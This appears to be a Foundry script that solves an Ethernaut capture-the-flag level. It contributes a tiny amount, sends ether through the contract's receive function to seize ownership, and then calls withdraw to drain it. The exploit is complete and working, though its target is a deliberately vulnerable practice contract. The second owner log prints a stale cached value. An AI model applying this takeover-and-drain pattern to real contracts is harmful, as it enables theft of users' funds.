// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {EthernautL2} from "../src/EthernautL2.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract EthernautL2Script is Script {
    EthernautL2 public ethernautL2 =
        EthernautL2(payable(0xdf88cf024ca2f4ddDF142fd6cAC1Cd00D6fd368a));

    function run() public {
        // Check who is the owner of the contract
        address owner = ethernautL2.owner();
        console.log("Owner: ", owner);

        // Check the contribution of the owner
        uint256 contribution = ethernautL2.contributions(owner);
        console.log("Contribution: ", contribution);

        // Contribute to the contract by calling the receive function and Check if the owner is changed
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ethernautL2.contribute{value: 0.00001 ether}();
        console.log("Contribution: ", ethernautL2.contributions(0xA86Ea1be0A43Ea977dd7489c7c91247B1a7bC50b));

        address(ethernautL2).call{value: 0.00001 ether}("");
        console.log("Owner: ", owner);

        ethernautL2.withdraw();
        vm.stopBroadcast();
    }
}
